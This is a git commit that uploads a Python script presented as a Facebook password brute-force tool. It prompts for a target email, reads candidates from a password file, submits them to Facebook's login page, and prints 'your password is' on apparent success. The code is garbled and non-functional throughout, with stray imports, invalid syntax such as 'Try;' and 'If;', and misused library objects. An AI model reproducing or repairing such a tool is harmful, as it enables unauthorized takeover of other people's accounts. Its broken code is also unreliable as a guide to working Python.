8345d979730d3bdef9810080e04aa59818f0b6c8
Cybernetics <79071277+shade234sherif@users.noreply.github.com>
2022-03-05 01:09:38 +0100

    Add files via upload

---
+++ brute.py
@@ -0,0 +1,64 @@
+import code
+import fileinput
+import importlib
+from itertools import count
+import sys
+from argparse import FileType
+from ast import Break, Continue, If, Try
+from math import pi
+from tkinter import BROWSE
+from tokenize import String
+import urllib
+from nturl2path import url2pathname
+import time
+from urllib.request import urlopen 
+
+3<4
+G=444333
+B=443333
+R=433333
+Y=333333
+
+print(' ___   ___     ___   ___   _   _   _____   ___    __   __  ___   ___     ___       ____ ')
+print('| __| | _ )   | _ ) | _ \ | | | | |_   _| | __|   \ \ / / | __| | _ \   |_  )     |__  |')
+print('| _|  | _ \   | _ \ |   / | |_| |   | |   | _|     \ V /  | _|  |   /    / /   _    / /') 
+print('|_|   |___/   |___/ |_|_\  \___/    |_|   |___|     \_/   |___| |_|_\   /___| (_)  /_/')
+print('FOLLOW US ON FB:www.facebook.com/cyberhacks6')
+print('GOD BLESS NIGERIA')
+                                                                                         
+file=open('password.txt','r')
+
+def login( email, password):
+    urlopen = 'https://www.facebook.com/login.php'
+    header = {'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36'}
+email=input.str("input target email/username:").strip()
+print("trying passwords with target email: " ,email)
+i=0
+while FileType :
+    password=fileinput.readline().strip()
+    i=+1
+if len(password) < 10:
+   Continue
+   print=str(i) +" : ",password
+response = BROWSE.open(urlopen);
+
+Try;
+If; response; code == 200
+BROWSE.select_form(nr=o)
+BROWSE.form['email']=email
+BROWSE.form['pass']=password
+response = BROWSE.submit()
+response_data = response.read()
+'find friends' in response_data or 'two-factor authentication' in response_data or 'security code' in response_data;
+print('your password is : ',password)
+
+Break
+n=1
+n<6
+n=1,2,3,4,5,6
+print('n/1,2,3,4,5 system cooldown n/')
+count(5)
+sys.exit
+
+
+
